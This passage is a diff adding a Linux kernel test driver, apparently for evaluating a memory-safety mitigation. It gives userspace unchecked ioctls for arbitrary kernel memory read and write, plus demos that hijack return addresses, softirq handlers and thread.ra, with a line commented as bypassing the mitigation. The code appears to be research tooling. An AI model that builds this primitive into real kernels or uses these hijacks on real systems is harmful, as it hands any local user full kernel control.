+++ b/drivers/misc/arbrw/arb_rw.c
@@ -0,0 +1,377 @@
+// FZY: Add a simple character device driver that allows reading and writing arbitrary memory addresses with ioctl, to assist testing the functionality of our mitigation
+
+#include <linux/cdev.h>
+#include <linux/device.h>
+#include <linux/fs.h>
+#include <linux/init.h>
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/slab.h>
+#include <linux/uaccess.h>
+#include <linux/interrupt.h>
+#include <linux/sched/task.h>
+#ifdef CONFIG_SDP_CACHE
+#include <linux/sdp_cache.h>
+#endif
+
+#define DEVICE_NAME "arb_rw"
+#define CLASS_NAME "arb_class"
+
+static int major_number;
+static struct class *arb_class = NULL;
+static struct device *arb_device = NULL;
+
+struct arb_request {
+  unsigned long addr;
+  void __user *data;
+  size_t size;
+};
+
+struct softirq_hijack_request {
+  unsigned long softirq_vec_addr;  // Base address of softirq_vec array
+  int softirq_nr;                  // Which softirq to hijack (0-9)
+  unsigned long original_handler;  // Output: the original handler address
+  unsigned long wrapper_addr;      // Output: the wrapper address that was written
+};
+
+#define ARB_READ _IOR('A', 1, struct arb_request)
+#define ARB_WRITE _IOW('A', 2, struct arb_request)
+#define ARB_RET_OVERWRITE _IO('A', 3)  // Hijack return address
+#define ARB_HIJACK_SOFTIRQ _IOWR('A', 4, struct softirq_hijack_request)  // Hijack softirq
+#define ARB_TRIGGER_OOPS _IO('A', 5)  // Trigger oops for testing panic_on_oops
+#define ARB_PRINT_KPTR _IO('A', 6)  // Print kernel pointer with %pK to test kptr_restrict
+
+#ifdef CONFIG_SDP_CACHE
+struct sdp_cache_test_result {
+  unsigned long obj0_addr;     // Virtual address of first allocated object
+  unsigned long obj1_addr;     // Virtual address of second allocated object
+  int           write_read_ok; // 1 if write/read verification passed
+};
+
+#define ARB_SDP_CACHE_TEST _IOR('A', 7, struct sdp_cache_test_result)
+#endif
+
+#define ARB_GET_CURRENT_TASK _IOR('A', 8, unsigned long)  // Get current task_struct address
+#define ARB_FLUSH_TLB _IO('A', 9)  // Flush TLB (sfence.vma)
+
+// Store the original return address so gadget_function can restore it
+static unsigned long saved_return_addr = 0;
+
+// Demo functions for return address overwriting (used by ARB_RET_OVERWRITE ioctl)
+static noinline void gadget_function(void) {
+  unsigned long *ret_addr_ptr;
+
+  printk(KERN_ALERT "arb_rw: *** EXPLOITATION SUCCESS! ***\n");
+  printk(KERN_ALERT "arb_rw: gadget_function was executed via return address overwrite!\n");
+  printk(KERN_ALERT "arb_rw: This proves the return address was successfully hijacked.\n");
+
+  // Restore the correct return address to break the loop
+  printk(KERN_INFO "arb_rw: Restoring original return address to exit cleanly...\n");
+
+  ret_addr_ptr = (unsigned long *)((unsigned long)__builtin_frame_address(0) - 8);
+
+  *ret_addr_ptr = saved_return_addr;
+  printk(KERN_INFO "arb_rw: Return address restored to: %px\n", (void *)saved_return_addr);
+}
+
+static noinline long vulnerable_function(void) {
+  unsigned long *ret_addr_ptr;
+  unsigned long old_ret_addr;
+  unsigned long gadget_addr = (unsigned long)gadget_function;
+
+  printk(KERN_INFO "arb_rw: === Return Address Overwrite Demo ===\n");
+  printk(KERN_INFO "arb_rw: vulnerable_function is executing...\n");
+
+  // Get the return address location on stack
+  ret_addr_ptr = (unsigned long *)((unsigned long)__builtin_frame_address(0) - 8);
+
+  // Save the original return address so gadget_function can restore it
+  old_ret_addr = *ret_addr_ptr;
+  saved_return_addr = old_ret_addr;
+
+  printk(KERN_INFO "arb_rw: Stack frame pointer: %px\n", __builtin_frame_address(0));
+  printk(KERN_INFO "arb_rw: Return address location: %px\n", ret_addr_ptr);
+  printk(KERN_INFO "arb_rw: Original return address: %px\n", (void *)old_ret_addr);
+  printk(KERN_INFO "arb_rw: gadget_function address: %px\n", (void *)gadget_addr);
+
+  // Attack: Overwrite the return address
+  printk(KERN_WARNING "arb_rw: Overwriting return address NOW...\n");
+  *ret_addr_ptr = gadget_addr;
+
+  printk(KERN_INFO "arb_rw: Return address has been overwritten!\n");
+  printk(KERN_INFO "arb_rw: When this function returns, it will jump to gadget_function\n");
+  printk(KERN_INFO "arb_rw: instead of returning to device_ioctl.\n");
+
+  return 0;
+  // When we return, execution will go to gadget_function instead of the caller!
+}
+
+// Target for thread.ra hijack PoC
+// Entered from __switch_to's ret after thread.ra was overwritten
+// a0 = prev task pointer (return value convention of __switch_to)
+noinline void thread_hijack_target(long prev) {
+  printk(KERN_ALERT "arb_rw: *** THREAD RA HIJACK SUCCESS! ***\n");
+  printk(KERN_ALERT "arb_rw: thread_hijack_target executing via thread.ra overwrite!\n");
+  printk(KERN_ALERT "arb_rw: This proves the saved ra in thread_struct was hijacked.\n");
+  printk(KERN_INFO "arb_rw: prev task_struct: %px\n", (void *)prev);
+
+  // Release the rq lock and do post-context-switch cleanup
+  // schedule_tail is what ret_from_fork uses, it calls finish_task_switch(prev) which releases the rq lock, then does balance_callback and preempt_enable
+  printk(KERN_INFO "arb_rw: Calling schedule_tail to release rq lock...\n");
+  schedule_tail((struct task_struct *)prev);
+
+  printk(KERN_INFO "arb_rw: Exiting hijacked thread with do_exit(0)...\n");
+  do_exit(0);
+}
+
+// Store original softirq handler
+unsigned long original_softirq_handler = 0;
+
+// Wrapper gadget for softirq hijacking
+static void softirq_hijack_wrapper(struct softirq_action *h) {
+  printk(KERN_ALERT "\narb_rw: *** SOFTIRQ HIJACKING SUCCESS! ***\n");
+  printk(KERN_ALERT "arb_rw: softirq_hijack_wrapper was executed!\n");
+  printk(KERN_ALERT "arb_rw: This proves the softirq_vec function pointer was successfully hijacked\n");
+  printk(KERN_INFO "arb_rw: softirq_action @ %px\n", h);
+
+  // Call the original handler if it exists
+  if (original_softirq_handler) {
+    printk(KERN_INFO "arb_rw: Now calling original softirq handler @ %px\n", (void *)original_softirq_handler);
+    ((void (*)(struct softirq_action *))original_softirq_handler)(h);
+  } else {
+    printk(KERN_WARNING "arb_rw: No original handler stored, skipping original execution\n");
+  }
+  
+  printk(KERN_INFO "arb_rw: Wrapper execution completed\n");
+}
+
+static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
+  struct arb_request req;
+  struct softirq_hijack_request softirq_req;
+
+  switch (cmd) {
+  case ARB_READ:
+    if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+      return -EFAULT;
+    }
+    if (copy_to_user(req.data, (void *)req.addr, req.size)) {
+      return -EFAULT;
+    }
+    break;
+
+  case ARB_WRITE:
+    if (copy_from_user(&req, (void __user *)arg, sizeof(req))) {
+      return -EFAULT;
+    }
+    if (copy_from_user((void *)req.addr, req.data, req.size)) {
+      return -EFAULT;
+    }
+    break;
+
+  case ARB_RET_OVERWRITE:
+    return vulnerable_function();
+
+  case ARB_HIJACK_SOFTIRQ:
+    if (copy_from_user(&softirq_req, (void __user *)arg, sizeof(softirq_req))) {
+      return -EFAULT;
+    }
+
+    if (softirq_req.softirq_nr < 0 || softirq_req.softirq_nr >= NR_SOFTIRQS) {
+      printk(KERN_ERR "arb_rw: Invalid softirq number: %d\n", softirq_req.softirq_nr);
+      return -EINVAL;
+    }
+
+    // Calculate address of the specific softirq_action entry 
+    unsigned long handler_addr = softirq_req.softirq_vec_addr + (softirq_req.softirq_nr * sizeof(void *));
+
+    printk(KERN_INFO "arb_rw: Hijacking softirq_vec[%d] at %lx\n", 
+           softirq_req.softirq_nr, handler_addr);
+
+    // Save the original handler by reading from the calculated address
+    original_softirq_handler = *(unsigned long *)handler_addr;
+    // FZY: Enable to bypass the mitigation and evaluate if the rest steps work correctly
+    original_softirq_handler = original_softirq_handler | 0xFFFF000000000000;
+    
+    softirq_req.original_handler = original_softirq_handler;
+
+    printk(KERN_INFO "arb_rw: Original handler: %lx\n", original_softirq_handler);
+    printk(KERN_INFO "arb_rw: Wrapper address: %px\n", softirq_hijack_wrapper);
+
+    // Overwrite with our wrapper by writing directly to the calculated address
+    *(void (**)(struct softirq_action *))handler_addr = softirq_hijack_wrapper;
+    softirq_req.wrapper_addr = (unsigned long)softirq_hijack_wrapper;
+
+    if (copy_to_user((void __user *)arg, &softirq_req, sizeof(softirq_req))) {
+      return -EFAULT;
+    }
+
+    printk(KERN_INFO "arb_rw: Successfully hijacked softirq handler\n");
+    break;
+
+  case ARB_TRIGGER_OOPS:
+    printk(KERN_WARNING "arb_rw: Triggering intentional oops for panic_on_oops testing\n");
+    // Intentionally dereference NULL to trigger an oops
+    {
+      int *null_ptr = NULL;
+      int value = *null_ptr;
+      printk(KERN_INFO "arb_rw: Value: %d (should never print)\n", value);
+    }
+    break;
+
+  case ARB_PRINT_KPTR:
+    printk(KERN_INFO "arb_rw: Testing kptr_restrict:\n");
+    printk(KERN_INFO "arb_rw:   device_ioctl %%pK: %pK\n", device_ioctl);
+    break;
+
+#ifdef CONFIG_SDP_CACHE
+  case ARB_SDP_CACHE_TEST: {
+    struct sdp_cache_test_result result = {0};
+    struct sdp_cache *cache;
+    u8 *obj0, *obj1;
+    bool ok = true;
+    int i;
+
+    // Step 1: Create an sdp_cache with 64-byte objects
+    cache = sdp_cache_create("arb_rw_sdp_test", 64, 8);
+    if (!cache) {
+      printk(KERN_ERR "arb_rw: [1] Failed to create sdp_cache\n");
+      return -ENOMEM;
+    }
+
+    // Step 2: Allocate two objects
+    obj0 = sdp_cache_alloc(cache);
+    if (!obj0) {
+      printk(KERN_ERR "arb_rw: [2] Failed to allocate obj0\n");
+      sdp_cache_destroy(cache);
+      return -ENOMEM;
+    }
+    obj1 = sdp_cache_alloc(cache);
+    if (!obj1) {
+      printk(KERN_ERR "arb_rw: [2] Failed to allocate obj1\n");
+      sdp_cache_free(cache, obj0);
+      sdp_cache_destroy(cache);
+      return -ENOMEM;
+    }
+    printk(KERN_INFO "arb_rw: [2] Allocated obj0=%px obj1=%px\n", obj0, obj1);
+
+    // Step 3: Write known patterns to both objects
+    memset(obj0, 0xAA, 64);
+    memset(obj1, 0xBB, 64);
+    printk(KERN_INFO "arb_rw: [3] Wrote 0xAA to obj0, 0xBB to obj1\n");
+
+    // Step 4: Read back and verify
+    for (i = 0; i < 64; i++) {
+      if (obj0[i] != 0xAA) {
+        ok = false;
+        printk(KERN_ERR "arb_rw: [4] obj0 verify failed at byte %d: got 0x%02x\n",
+               i, obj0[i]);
+        break;
+      }
+    }
+    for (i = 0; i < 64 && ok; i++) {
+      if (obj1[i] != 0xBB) {
+        ok = false;
+        printk(KERN_ERR "arb_rw: [4] obj1 verify failed at byte %d: got 0x%02x\n",
+               i, obj1[i]);
+        break;
+      }
+    }
+    printk(KERN_INFO "arb_rw: [4] Write/read verification: %s\n",
